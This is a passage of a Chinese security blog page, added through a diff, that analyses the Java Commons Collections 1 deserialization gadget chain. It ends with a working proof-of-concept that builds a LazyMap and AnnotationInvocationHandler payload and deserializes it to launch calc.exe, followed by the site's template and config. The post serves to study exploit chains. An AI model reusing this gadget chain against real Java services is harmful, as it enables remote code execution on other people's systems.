class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115150221455.png" alt="image-20240115150221455"></p>
+<p>因为LazyMap实现的这条链，没有用到put方法，所以构造函数时也不需要Retention来满足条件</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="Java" alt="tpaer">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>tpaer
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/posts/954915702.html" target="_blank">Java利用链CommonCollections1分析</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>nice or terrible.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="" target="_blank"></a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/category/web/">web</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/posts/3980978188.html" class="prev-prefix">« </a> 上一篇：    <a href="/posts/3980978188.html" title="发布于 2024-01-09 10:39">Java内存马的研究与分析（一）</a>
+                        <br>
+                    
+                    
+                        <a href="/posts/2714285355.html" class="next-prefix">» </a> 下一篇：    <a href="/posts/2714285355.html" title="发布于 2024-01-04 09:56">Java利用链URLDNS分析</a>
+                    
+                </div>
+            </div>
+             
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>Tpaer Blog</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/avatar.png">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://onetpaer.github.io" target="_blank"><span>tpaer</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="GitHub" href="https://github.com/onetpaer" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "onetpaer",
+        GitHubRepositories : "hacker-note",
+
+        User             : "tpaer",
+        UserAvatar       : "/image/sidebar/avatar.png",
+        WebsiteStartDate : "2023-01-01",
+        Home             : "https://onetpaer.github.io",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Tpaer BLOG",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) Welcome back!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/tlogo.png",
+            dark  : "/image/website/logo/tlogo.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.png",
+            
+        ],
+        HomeBannerText  : "Cybersecurity",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.png",
+            
+                "/image/header/article3.png",
+            
+                "/image/header/article4.png",
+            
+        ],
+
+        OtherBannerText : "All because of love",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "Tpaer Blog",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/onetpaer",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>hello</div><div>&copy; 2023-2077 tpaer. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Tpaer Blog",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "TIB5V1ZDSN",
+            apiKey        : "50d0249e92080e370df32275e4511295",
+            indexName     : "onetpaer",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "nice or terrible."
+        },
+            
+        Theme : {
+            url  : "",
+            name : ""
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
